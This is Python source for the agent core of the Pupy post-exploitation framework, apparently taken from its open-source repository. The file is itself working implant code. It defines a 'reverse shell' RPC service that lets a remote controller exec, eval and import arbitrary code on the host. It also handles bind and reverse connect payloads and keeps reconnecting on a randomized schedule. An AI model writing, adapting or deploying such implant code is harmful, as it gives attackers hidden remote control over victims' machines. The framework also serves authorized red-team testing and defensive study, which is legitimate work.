# -*- coding: utf-8 -*-
# ---------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
# 1. Redistributions of source code must retain the above copyright notice,
# this list of conditions and the following disclaimer.
#
# 2. Redistributions in binary form must reproduce the above copyright notice,
# this list of conditions and the following disclaimer in the documentation
# and/or other materials provided with the distribution.
#
# 3. Neither the name of the copyright holder nor the names of its contributors
# may be used to endorse or promote products derived from this software without
# specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE
# ---------------------------------------------------------------

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

import sys

import threading
import os
import json
import random
import zlib
import time

from pupy.network import conf
from pupy.network.lib.base_launcher import LauncherError
from pupy.network.lib.connection import PupyConnection
from pupy.network.lib.streams.PupySocketStream import PupyChannel
from pupy.network.lib.buffer import Buffer
from pupy.network.lib.msgtypes import MSG_TYPES_PACK
from pupy.network.lib.rpc.core.service import Service, ModuleNamespace
from pupy.network.lib.compat import execute, with_metaclass, as_native_string

import umsgpack

import pupy.agent as agent

if sys.version_info.major > 2:
    xrange = range
    builtin = 'builtins'
else:
    builtin = '__builtin__'

REVERSE_SLAVE_CONF = dict(
    allow_all_attrs=True,
    allow_public_attrs=True,
    allow_pickle=True,
    allow_getattr=True,
    allow_setattr=True,
    allow_delattr=True,
    import_custom_exceptions=False,
    propagate_SystemExit_locally=True,
    propagate_KeyboardInterrupt_locally=True,
    instantiate_custom_exceptions=True,
    instantiate_oldstyle_exceptions=True,
)


class Namespace(dict):
    pass


class Cleanups(list):
    pass


logger = agent.get_logger('service')
_all = as_native_string('*')


def _import(name):
    return __import__(
        as_native_string(name),
        None, None, (_all,)
    )


class UpdatableModuleNamespace(ModuleNamespace):
    __slots__ = ()

    def __invalidate__(self, name):
        cache = self._ModuleNamespace__cache
        if name in cache:
            del cache[name]

    def __getitem__(self, name):
        return super(UpdatableModuleNamespace, self).__getitem__(name)

    exposed___getitem__ = __getitem__

    def __getattr__(self, name):
        if name.startswith('___'):
            if __debug__:
                logger.debug('Access UpdatableModuleNamespace.%s - deny', name)

            raise AttributeError(name)
        elif name.startswith('exposed_'):
            if __debug__:
                logger.debug(
                    'Access UpdatableModuleNamespace.%s - '
                    'fix invalid exposed_', name
                )

            name = name[8:]

        name = as_native_string(name)

        try:
            result = super(UpdatableModuleNamespace, self).__getattr__(name)
        except AttributeError:
            if __debug__:
                logger.debug(
                    'Access UpdatableModuleNamespace.%s -> not found', name
                )

            raise

        if __debug__:
            logger.debug(
                'Access UpdatableModuleNamespace.%s -> %s', name, result
            )

        return result


class ReverseSlaveService(Service):
    """ Pupy reverse shell rpyc service """

    __slots__ = (
        'exposed_namespace', 'exposed_cleanups', 'client'
    )

    def __init__(self, conn):
        self.exposed_namespace = Namespace()
        self.exposed_cleanups = Cleanups()

        super(ReverseSlaveService, self).__init__(conn)

    def on_connect(self):
        self.exposed_namespace = Namespace()
        self.exposed_cleanups = Cleanups()
        self._conn._config.update(REVERSE_SLAVE_CONF)

        pupyimporter = __import__('pupyimporter')
        is_purepy = sys.purepy
        self._conn.root.initialize_v2(
            1, (
                sys.version_info.major,
                sys.version_info.minor
            ),
            self.exposed_namespace,
            agent.namespace,
            __import__(builtin),
            self.exposed_register_cleanup,
            self.exposed_unregister_cleanup,
            self.exposed_exit,
            self.exposed_eval,
            self.exposed_execute,
            self.exposed_get_infos(),
            tuple(sys.modules),
            tuple(pupyimporter.modules),
            pupyimporter,
            {
                function: getattr(pupyimporter, function)
                for function in dir(pupyimporter)
                if hasattr(getattr(pupyimporter, function), '__call__')
            },
            is_purepy
        )

    def on_disconnect(self):
        try:
            if self.client.terminated:
                return

            for cleanup in self.exposed_cleanups:
                try:
                    cleanup()
                except Exception as e:
                    agent.remote_error('Disconnect/cleanup: {}', e)

            self.exposed_cleanups = []

        finally:
            try:
                self._conn.close()
            except Exception as e:
                agent.remote_error('Disconnect/close: {}', e)

            if os.name == 'posix':
                try:
                    for _ in xrange(1024):
                        if not os.waitpid(-1, os.WNOHANG):
                            break

                except OSError:
                    pass

    def exposed_exit(self):
        logger.debug('TERMINATION REQUEST')

        if agent.manager:
            logger.debug('Send termination event to all tasks')
            agent.manager.event(agent.manager.TERMINATE)

        if self._conn:
            self._conn.close()

        if self.client:
            self.client.terminate()
        else:
            logger.warning('Client not set, termination status was not set')

        for thread in threading.enumerate():
            if not thread.daemon:
                logger.debug('Non daemon thread: %s', thread)

    def exposed_register_cleanup(self, method):
        self.exposed_cleanups.append(method)

    def exposed_unregister_cleanup(self, method):
        self.exposed_cleanups.remove(method)

    def exposed_execute(self, text):
        """execute arbitrary code (using ``exec``)"""
        try:
            execute(text, self.exposed_namespace)
        except Exception as e:
            logger.debug(
                'Execute failed: arg type=%s arg=%s: %s',
                type(text), text, e
            )

            raise

    def exposed_get_infos(self, s=None):
        if not s:
            infos = {}

            if self.client:
                infos.update(self.client.iteritems())
                infos['launcher'] = self.client.launcher

            debug, debug_file = agent.get_debug()

            infos.update({
                'debug': debug,
                'debug_logfile': debug_file,
                'revision': agent.revision,
                'native': agent.is_native()
            })

            return infos

        return self.client[s]

    def exposed_eval(self, text):
        """evaluate arbitrary code (using ``eval``)"""
        return eval(text, self.exposed_namespace)

    def exposed_getmodule(self, name):
        """imports an arbitrary module"""
        return _import(name)

    def exposed_obtain_call(self, function, packed_args):
        if packed_args is not None:
            packed_args = zlib.decompress(packed_args)
            args, kwargs = umsgpack.loads(packed_args)
        else:
            args, kwargs = [], {}

        result = function(*args, **kwargs)

        packed_result = umsgpack.dumps(result)
        packed_result = zlib.compress(packed_result)

        return packed_result

    def exposed_msgpack_dumps(self, obj, compressed=False):
        data = Buffer(compressed=compressed)
        umsgpack.dump(obj, data)
        data.flush()
        return data

    def exposed_json_dumps(self, obj, compressed=False):
        try:
            data = json.dumps(obj, ensure_ascii=False)
        except:
            try:
                import locale
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding=locale.getpreferredencoding()
                )
            except:
                data = json.dumps(
                    obj,
                    ensure_ascii=False,
                    encoding='latin1'
                )

        if compressed:
            if not isinstance(data, bytes):
                data = data.encode('utf-8')

            data = zlib.compress(data)

        return data

    def exposed_getconn(self):
        """returns the local connection instance to the other side"""
        return self._conn


class BindSlaveService(ReverseSlaveService):

    def on_connect(self):
        agent.dprint('Bind service: on_connect called')

        try:
            from pupy_credentials import BIND_PAYLOADS_PASSWORD
            password = BIND_PAYLOADS_PASSWORD

            agent.dprint('Expected password: {}', repr(password))

        except ImportError:
            from pupy.pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            password = credentials['BIND_PAYLOADS_PASSWORD']

            agent.dprint('Expected password: {} (fallback)', repr(password))

        remote_password = self._conn.root.get_password()

        agent.dprint('Remote password: {}', remote_password)

        if remote_password != password:
            self._conn.close()
            raise KeyboardInterrupt("wrong password")

        super(BindSlaveService, self).on_connect()


class PupyClient(object):
    __slots__ = (
        'cid', 'delays',
        '_launcher', 'launcher_args', 'terminated',
        'connection_info', '_connection', '_attempt',
        '_bind_service', '_connect_service', '_custom_info',
        '_broadcast_event'
    )

    def __init__(self, cid, launcher, launcher_args, delays):
        self.cid = cid
        self._launcher = launcher
        self.launcher_args = launcher_args
        self.delays = delays
        self.terminated = False
        self._attempt = 0
        self._custom_info = {}
        self._broadcast_event = None

        class client_initializer(type):
            __slots__ = ()

            def __init__(cls, *args, **kwargs):
                super(client_initializer, cls).__init__(*args, **kwargs)
                cls.client = self

        class WrappedBindSlaveService(
                with_metaclass(client_initializer, BindSlaveService)):
            pass

        class WrappedReverseSlaveService(
                with_metaclass(client_initializer, ReverseSlaveService)):
            pass

        self._bind_service = WrappedBindSlaveService
        self._connect_service = WrappedReverseSlaveService

        self.reset_connection_info()

    def set_broadcast_event(self, callback):
        self._broadcast_event = callback

    def broadcast_event(self, eventid, *args, **kwargs):
        if self._connection:
            logger.debug(
                'Pupy connected: broadcast event via connection. EventId = %08x',
                eventid)

            try:
                self._connection.root.broadcast_event(eventid, *args, **kwargs)
                return
            except Exception as e:
                logger.exception(e)

        if self._broadcast_event:
            logger.debug(
                'Pupy is not connected, but broadcast_event defined (%s). EventId = %08x',
                agent.broadcast_event, eventid)

            try:
                self._broadcast_event(eventid, *args, **kwargs)
                logger.debug('Pupy connected: broadcast completed')
                return
            except Exception as e:
                logger.exception(e)

        logger.debug(
            'No way to report event. EventId = %08x', eventid)

    def set_connection_info(self, connection):
        self.connection_info = {
            'hostname': self._launcher.hostname,
            'host': self._launcher.host,
            'port': self._launcher.port,
            'proxies': self._launcher.proxies,
            'transport': self._launcher.transport
        }

        self._connection = connection

    def reset_connection_info(self):
        self.connection_info = {}
        self._connection = None

    def terminate(self):
        self.terminated = True
        if self._connection:
            try:
                self._connection.close()
            except EOFError:
                pass

    def __getitem__(self, key):
        if key.startswith('_'):
            return

        if key in PupyClient.__slots__:
            return getattr(self, key)

        if key in self._custom_info:
            return self._custom_info[key]

    @property
    def connected(self):
        if not self._connection:
            return False

        return True

    @property
    def launcher(self):
        return self._launcher.name

    def set_info(self, key, value):
        if key in PupyClient.__slots__:
            setattr(self, key, value)
            agent.dprint('set client info {}: {}', key, value)
            return

        self._custom_info[key] = value
        agent.dprint('set custom info {}: {}', key, value)

    def unset_info(self, key):
        if key in PupyClient.__slots__:
            setattr(self, key, None)
            agent.dprint('unset client info {}', key)
            return

        try:
            del self._custom_info[key]
            agent.dprint('unset custom info {}', key)
        except KeyError:
            pass

    def iteritems(self):
        for key in PupyClient.__slots__:
            if key.startswith('_'):
                continue

            yield key, getattr(self, key)

        for key in self._custom_info:
            yield key, self._custom_info[key]

    def _get_next_wait(self):
        for conf_attempt, delay_min, delay_max in self.delays:
            if conf_attempt == -1 or self._attempt < conf_attempt:
                return random.randint(delay_min, delay_max)

        return random.randint(150, 300)

    def _iterate_launcher(self):
        stream = None
        for ret in self._launcher.iterate():
            logger.debug('Operation state: Terminated = %s', self.terminated)

            if self.terminated:
                logger.warning('Loop terminated')
                break

            logger.debug('Acquire launcher: %s', ret)

            try:
                if isinstance(ret, tuple):  # bind payload
                    server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
                    self.set_connection_info(
                        server_class(
                            self._bind_service,
                            port=port,
                            hostname=address,
                            authenticator=authenticator,
                            stream=stream,
                            transport=transport,
                            transport_kwargs=transport_kwargs,
                            pupy_srv=None,
                        )
                    )

                    self._connection.start()

                else:  # connect payload
                    stream = ret

                    self.set_connection_info(
                        PupyConnection(
                            None,
                            self._connect_service,
                            PupyChannel(stream), config={},
                            ping=stream.KEEP_ALIVE_REQUIRED
                        )
                    )

                    self._connection.init()
                    self._connection.loop()
                    self._attempt = 0

            except SystemExit:
                raise

            except EOFError:
                pass

            except Exception as e:
                logger.error(e)
                agent.remote_error('Iterate launcher: {}', e)

            finally:
                logger.debug('Launcher completed')

                self.reset_connection_info()

                if stream is not None:
                    try:
                        stream.close()
                    except:
                        pass

            if self.terminated:
                break

    def run(self):
        while not self.terminated:
            try:
                self._iterate_launcher()

            except Exception as e:
                agent.remote_error('Launcher: {}', e)

                if type(e) == SystemExit:
                    self.terminated = True

            finally:
                if not self.terminated:
                    sleep_secs = self._get_next_wait()
                    logger.info(
                        'Attempt %d - reconnect in %d seconds...',
                        self._attempt, sleep_secs)
                    time.sleep(sleep_secs)

                    self._attempt += 1


def run(config):
    launcher = config.get('launcher')
    launcher_args = config.get('launcher_args')
    scriptlets = config.pop('scriptlets', [])

    logger.debug('Launcher: %s', launcher)
    logger.debug('Launcher args: %s', launcher_args)

    if launcher not in conf.launchers:
        sys.exit("No such launcher: %s" % launcher)

    launcher = conf.launchers[launcher]()

    try:
        launcher.parse_args(launcher_args)
    except LauncherError as e:
        launcher.arg_parser.print_usage()
        sys.exit(e)

    if scriptlets:
        logger.debug('Start scriptlets')

        for scriptlet in scriptlets:
            try:
                exec(scriptlet)
            except Exception as e:
                logger.exception(e)

        logger.debug('Scriptlets completed')

    logger.debug('CID: %08x', config.get('cid', 0))

    agent.namespace = UpdatableModuleNamespace(_import)

    agent.client = PupyClient(
        config.get('cid', 1337),
        launcher, launcher_args,
        config.get(
            'delays', (
                (3, 5, 10),
                (5, 10, 30),
                (10, 30, 60),
                (-1, 60, 240)
            )
        )
    )

    agent.client.run()

    logger.debug('Exited')

    # sometimes the client does not exit properly
    time.sleep(10)
    sys.exit(0)
